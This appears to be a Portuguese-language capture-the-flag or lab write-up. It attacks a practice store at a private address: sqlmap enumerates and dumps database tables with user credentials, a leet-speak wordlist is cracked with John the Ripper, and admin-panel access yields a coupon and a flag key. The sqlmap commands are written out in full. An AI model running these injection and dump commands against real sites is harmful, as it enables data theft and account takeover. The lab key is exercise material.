Evidencia 1

Primeiro passo, executar um sqlmap que vai me trazer os dbs que está sendo utilizados, foi utilizada a URL com parametros de cada produto do site.

```
sqlmap -r URLs.req --batch --dbs
```

![[Pasted image 20250620173427.png]]


Evidencia 2

Quando encontrar a coluna necessária, no caso eu estou procurando a key no banco de dados mais atual da Decstore.

```
sqlmap -u "http://172.16.1.245/produtos.php?prod=1" -D deckstore -T chave --dump 
```

![[Pasted image 20250620180306.png]]

Evidencia 3

O usuário foi encontrado no bds da Decstore, na coluna de usuários

```
sqlmap -u "http://172.16.1.245/produtos.php?prod=1" -D deckstore -T usuarios --columns --batch --dump
```

![[Pasted image 20250625164508.png]]

Até o momento eu não entendi muito bem o porque, mas é necessario utilizar o "leet", no usuários, para conseguir ter a senha do usuario.

**Leet** (ou **1337**, de "leet speak") é uma forma de escrita usada principalmente por pessoas da área de tecnologia e comunidades hackers para substituir **letras por números ou símbolos semelhantes visualmente**.

![[Pasted image 20250625164819.png]]

Após de criar uma lista de leet, utilizei o Jonh pra me trazer a senha necessária

![[Pasted image 20250625164916.png]]

Evidencia 3

Já dentro do sistema adm (http://172.16.1.245/sysadm/adm_login.php) fui procurar na área de promoções onde o enunciado estava dizendo, lá acabei encontrando um cupom de desconto de 50% 

key = 9043431e415d8bd4412f8375b49ababe



